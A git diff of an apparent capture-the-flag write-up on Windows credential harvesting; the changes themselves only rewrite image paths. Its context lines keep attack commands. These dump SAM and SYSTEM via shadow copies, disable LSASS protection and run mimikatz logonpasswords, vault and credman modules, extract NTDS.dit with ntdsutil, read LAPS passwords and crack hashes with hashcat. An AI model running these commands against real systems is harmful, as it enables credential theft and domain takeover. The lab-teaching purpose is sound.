@@ -155,7 +155,7 @@ Gaining initial access to a target network enables attackers to perform various 
 
 We need to answer this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528122048.png)
+![](cybersecurity/images/Pasted%2520image%252020250528122048.png)
 
 Let's use this on cmd:
 
@@ -165,7 +165,7 @@ reg query HKLM /f flag /t REG_SZ /s
 
 We can see this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528122111.png)
+![](cybersecurity/images/Pasted%2520image%252020250528122111.png)
 
 We got the password:
 
@@ -183,7 +183,7 @@ Get-ADUser -Filter * -Properties * | Select-Object DistinguishedName, SamAccount
 
 We can see this:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528122215.png)
+![](cybersecurity/images/Pasted%2520image%252020250528122215.png)
 
 We got the password:
 
@@ -342,7 +342,7 @@ To begin with, we need to copy the `SAM` and `SYSTEM` files, let's use `wmic` fo
 wmic shadowcopy call create Volume='C:\'
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528122934.png)
+![](cybersecurity/images/Pasted%2520image%252020250528122934.png)
 
 We can now use `vssadmin` to confirm that we have a shadow copy of the `C:\` volume:
 
@@ -350,7 +350,7 @@ We can now use `vssadmin` to confirm that we have a shadow copy of the `C:\` vol
 vssadmin list shadows
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528123044.png)
+![](cybersecurity/images/Pasted%2520image%252020250528123044.png)
 
 As seen, the shadow copy was successfully created, the route for this is:
 
@@ -366,7 +366,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528123246.png)
+![](cybersecurity/images/Pasted%2520image%252020250528123246.png)
 
 As seen, we got both files on the administrator's desktop, let's transfer them using scp, first, make sure ssh is enabled and running on your linux machine, then inside of windows do:
 
@@ -397,7 +397,7 @@ We got our hash:
 98d3a787a80d08385cea7fb4aa2a4261
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528124855.png)
+![](cybersecurity/images/Pasted%2520image%252020250528124855.png)
 
 
 
@@ -543,17 +543,17 @@ Now, if we try to run the "sekurlsa::logonpasswords" command again, it must be e
 
 ---
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528125256.png)
+![](cybersecurity/images/Pasted%2520image%252020250528125256.png)
 
 As seen, `LSASS` protection is enabled, we need to disable it:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528125338.png)
+![](cybersecurity/images/Pasted%2520image%252020250528125338.png)
 
 ```markup
 !processprotect /process:lsass.exe /remove
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528125353.png)
+![](cybersecurity/images/Pasted%2520image%252020250528125353.png)
 
 
 We can now use the command again:
@@ -562,9 +562,9 @@ We can now use the command again:
 sekurlsa::logonpasswords
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528125446.png)
+![](cybersecurity/images/Pasted%2520image%252020250528125446.png)
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528125454.png)
+![](cybersecurity/images/Pasted%2520image%252020250528125454.png)
 
 
 # Windows Credential Manager
@@ -706,7 +706,7 @@ The techniques discussed in this task also could be done through other tools suc
 
 We need to answer:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528125847.png)
+![](cybersecurity/images/Pasted%2520image%252020250528125847.png)
 
 In order to speed up the process, we can use powershell:
 
@@ -718,7 +718,7 @@ Import-Module C:\Tools\Get-WebCredentials.ps1
 Get-WebCredentials
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528130038.png)
+![](cybersecurity/images/Pasted%2520image%252020250528130038.png)
 
 As seen, using the module, we can get the password pretty easily, we got:
 
@@ -737,7 +737,7 @@ sekurlsa::credman
 
 We can see the `SMB` share:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528130223.png)
+![](cybersecurity/images/Pasted%2520image%252020250528130223.png)
 
 Got our password:
 
@@ -751,7 +751,7 @@ For the last question, we can use mimikatz again to find the credentials for `th
 vault::cred /patch
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528130427.png)
+![](cybersecurity/images/Pasted%2520image%252020250528130427.png)
 
 As seen, we got the password for the user, we can now run PowerShell as `thm-local`:
 
@@ -759,7 +759,7 @@ As seen, we got the password for the user, we can now run PowerShell as `thm-loc
 runas /user:thm-local powershell
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528130555.png)
+![](cybersecurity/images/Pasted%2520image%252020250528130555.png)
 
 As seen, we got a shell as `thm-local`, let's get our flag:
 
@@ -870,7 +870,7 @@ hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/wordlist/such/as/rockyou.
 
 We need to answer:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528130901.png)
+![](cybersecurity/images/Pasted%2520image%252020250528130901.png)
 
 We can begin by doing:
 
@@ -878,11 +878,11 @@ We can begin by doing:
 powershell “ntdsutil.exe ‘ac i ntds’ ‘ifm’ ‘create full c:\temp’ q q”
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528131014.png)
+![](cybersecurity/images/Pasted%2520image%252020250528131014.png)
 
 We will get this output, we can see both directories on `c:\temp`:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528131121.png)
+![](cybersecurity/images/Pasted%2520image%252020250528131121.png)
 
 We can use scp again to transfer them:
 
@@ -1112,7 +1112,7 @@ CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    FakePassword 
 
 ---
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528132953.png)
+![](cybersecurity/images/Pasted%2520image%252020250528132953.png)
 
 First answer is:
 
@@ -1129,7 +1129,7 @@ Get-AdmPwdPassword CREDS-HARVESTIN
 
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528133309.png)
+![](cybersecurity/images/Pasted%2520image%252020250528133309.png)
 
 We got:
 
@@ -1143,7 +1143,7 @@ For the last question:
 Get-ADGroupMember -Identity “LAPsReader”
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528133345.png)
+![](cybersecurity/images/Pasted%2520image%252020250528133345.png)
 
 Answer is:
 
@@ -1256,7 +1256,7 @@ The end goal for SMB relay and LLMNR/NBNS Poisoning attacks is to capture authe
 
 ---
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528133708.png)
+![](cybersecurity/images/Pasted%2520image%252020250528133708.png)
 
 Let's first enumerate for SPN users, we need to do:
 
@@ -1317,7 +1317,7 @@ Got our password:
 Passw0rd1
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250528134354.png)
+![](cybersecurity/images/Pasted%2520image%252020250528134354.png)
 
 
 # Conclusion
